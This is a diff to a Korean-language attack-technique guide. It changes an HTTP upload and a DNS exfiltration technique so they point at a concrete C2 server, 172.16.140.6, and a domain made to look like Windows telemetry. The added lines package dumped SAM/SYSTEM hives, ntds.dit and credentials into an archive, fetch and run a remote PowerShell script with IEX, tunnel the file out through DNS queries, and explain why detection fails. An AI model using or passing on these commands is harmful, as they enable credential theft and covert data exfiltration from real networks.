@@ -656,28 +656,164 @@ WMI를 통한 원격 프로세스 실행. 이벤트 로그에 덜 기록됨.
 ### 기법 37 — HTTP 업로드
 
 ```powershell
-Invoke-RestMethod -Uri "http://<attacker>/upload" -Method POST -InFile C:\Temp\loot.zip
+Invoke-RestMethod -Uri "http://172.16.140.6:8080/upload" -Method POST -InFile C:\Temp\loot.zip
 ```
 
-일반 HTTP 트래픽으로 위장한 파일 업로드.
+일반 HTTP 트래픽으로 위장한 파일 업로드. 포트 80/443이 열려있을 때 사용.
 
 ---
 
-### 기법 38 — DNS 유출
+### 기법 38 — DNS 파일 유출 (C2 서버 연동)
 
-```cmd
-nslookup <인코딩된데이터>.<attacker_dns>
+> **실제 연동 C2**: `172.16.140.6` · 도메인: `telemetry.windows-cdn.net`  
+> **결과 확인**: `http://172.16.140.6:8080` → 세션 선택 → **유출 파일** 탭
+
+```powershell
+# exfil_dns.ps1 을 Windows 타겟으로 전달 후 실행
+powershell -ExecutionPolicy Bypass -File exfil_dns.ps1
 ```
 
-**DNS를 파일 전송 채널로 사용**. HTTP가 차단된 환경에서도 DNS는 보통 허용됨.  
-데이터를 Base64로 인코딩 → 서브도메인에 포함 → DNS 쿼리로 전송 → 공격자 DNS 서버에서 수신.
+---
+
+#### 📌 왜 DNS인가?
+
+| 방법 | 차단 가능성 | 이유 |
+|------|-----------|------|
+| HTTP(S) POST | 높음 | 프록시/방화벽이 외부 URL 필터링 |
+| SMB/FTP | 높음 | 포트 차단, 보안장비 탐지 |
+| **DNS 쿼리** | **낮음** | 인터넷 접속을 위해 UDP 53 반드시 열려있어야 함 |
+
+DNS는 인터넷 기본 인프라이므로 방화벽에서 막으면 인터넷 자체가 안 됨.  
+→ **공격자는 이 특성을 이용해 데이터를 DNS 쿼리 이름에 숨겨 전송**
+
+---
+
+#### 🔧 exfil_dns.ps1 동작 원리
 
 ```
-파일 내용: "secret"
-인코딩: "c2VjcmV0"
-DNS 쿼리: nslookup c2VjcmV0.attacker.com
-공격자 DNS 서버 로그에서 수신
+loot.zip (바이너리) 
+  │
+  ▼ Base32 인코딩 (ASCII 안전 문자만 사용, DNS 레이블 규격 준수)
+KRUGKIDROVUWG2ZAMJZG653OEBTG66BANJ2W24DTEBXXMZLS...
+  │
+  ▼ 40자 단위로 청크 분할
+[청크 0] KRUGKIDROVUWG2ZAMJZG
+[청크 1] 653OEBTG66BANJZW24DT  
+[청크 2] EBXXMZLSEB3GK4TPNFZX
+  ...
+  │
+  ▼ DNS A 쿼리로 전송 (UDP 53 → 172.16.140.6)
+f.{세션ID}.{파일명B32}.{총청크수}.{인덱스}.{청크데이터}.telemetry.windows-cdn.net
 ```
+
+**실제 전송되는 DNS 쿼리 예시:**
+```
+f.ac109dbb.MRSWC.10.0.KRUGKIDROVUWG2ZAMJZG.telemetry.windows-cdn.net → A 쿼리
+f.ac109dbb.MRSWC.10.1.653OEBTG66BANJZW24DT.telemetry.windows-cdn.net → A 쿼리
+f.ac109dbb.MRSWC.10.2.EBXXMZLSEB3GK4TPNFZX.telemetry.windows-cdn.net → A 쿼리
+  ...
+```
+
+| 레이블 | 값 예시 | 의미 |
+|--------|---------|------|
+| `f` | `f` | 파일 유출 쿼리 식별자 |
+| `{세션ID}` | `ac109dbb` | 클라이언트 IP를 hex 변환한 값 |
+| `{파일명B32}` | `MRSWC` | `loot.zip` → Base32 인코딩 |
+| `{총청크수}` | `10` | 전체 청크 개수 |
+| `{인덱스}` | `0~9` | 현재 청크 번호 |
+| `{청크데이터}` | `KRUGK...` | 파일 바이너리의 Base32 조각 |
+
+---
+
+#### 🖥️ C2 서버 수신 흐름 (172.16.140.6)
+
+```
+Windows 타겟                          172.16.140.6 (DNS :53)
+───────────────────────────────────────────────────────────►
+f.ac109dbb.MRSWC.10.0.KRUGK....telemetry.windows-cdn.net
+f.ac109dbb.MRSWC.10.1.653OE....telemetry.windows-cdn.net
+f.ac109dbb.MRSWC.10.2.EBXXM....telemetry.windows-cdn.net
+  ... (총 10개 쿼리)
+
+                                      모든 청크 수신 완료 시:
+                                      Base32 조각 이어붙이기
+                                            │
+                                      Base32 디코딩 → 바이너리 복원
+                                            │
+                                      exfil_store에 저장
+                                            │
+                              http://172.16.140.6:8080
+                              → [유출 파일] 탭에서 확인 + 다운로드
+```
+
+---
+
+#### ⚙️ 실행 절차 (실제 공격 시나리오)
+
+**Step 1 — loot.zip 준비 (앞선 단계에서 수집한 파일 패키징)**
+
+```powershell
+# 기법 29~36에서 덤프한 파일들을 하나로 압축
+Compress-Archive -Path C:\Temp\sam.hive, C:\Temp\system.hive, `
+  C:\Temp\ntds.dit, C:\Temp\creds.txt `
+  -DestinationPath C:\Temp\loot.zip -Force
+```
+
+**Step 2 — DNS 유출 실행**
+
+```powershell
+# exfil_dns.ps1 이 없으면 아래처럼 다운로드 후 실행
+IEX (New-Object Net.WebClient).DownloadString('http://172.16.140.6:8080/exfil_dns.ps1')
+
+# 또는 파일로 저장 후 실행
+powershell -ExecutionPolicy Bypass -File C:\Temp\exfil_dns.ps1 -TargetFile C:\Temp\loot.zip
+```
+
+**실행 시 콘솔 출력:**
+```
+[*] DNS 파일 유출 시작
+[*] 대상 파일 : C:\Temp\loot.zip
+[*] C2 서버   : 172.16.140.6
+[*] 도메인    : telemetry.windows-cdn.net
+
+[*] 파일명  : loot.zip
+[*] 파일크기: 48293 bytes
+[*] 총 청크 : 1289 개
+[*] 세션 ID : ac109dbb
+
+[*] 전송 중... 1289/1289 (100%)
+
+[+] 유출 완료!
+    파일    : loot.zip
+    크기    : 48293 bytes
+    소요시간: 65초
+    확인    : http://172.16.140.6:8080 → 세션 선택 → Files 탭
+```
+
+**Step 3 — C2 웹 UI에서 수신 확인**
+
+`http://172.16.140.6:8080` 접속 → 세션 선택 → **유출 파일** 탭
+
+```
+┌─────────────────────────────────────────────────────────┐
+│  🗜️  loot.zip                               47.2 KB     │
+│      수신: 14:32:17 · DNS 터널링 via port 53   [⬇ 다운로드] │
+└─────────────────────────────────────────────────────────┘
+```
+
+---
+
+#### 🔍 탐지 어려운 이유
+
+| 탐지 시도 | 한계 |
+|---------|------|
+| 방화벽 UDP 53 차단 | DNS가 안 되면 인터넷 자체 불통 → 실제 차단 불가 |
+| DNS 쿼리 로깅 | 쿼리 이름이 암호화된 문자열처럼 보여 육안 식별 어려움 |
+| 도메인 블랙리스트 | `telemetry.windows-cdn.net` → Windows 정상 트래픽처럼 위장 |
+| 트래픽 볼륨 분석 | 청크당 40자 / 50ms 간격 → 느리고 분산된 쿼리라 임계치 미달 |
+
+**XDR 탐지 시그니처 (Cortex XDR):**  
+비정상적으로 긴 서브도메인 쿼리 반복 → **DNS 터널링 의심 알림 발생**
 
 ---
 
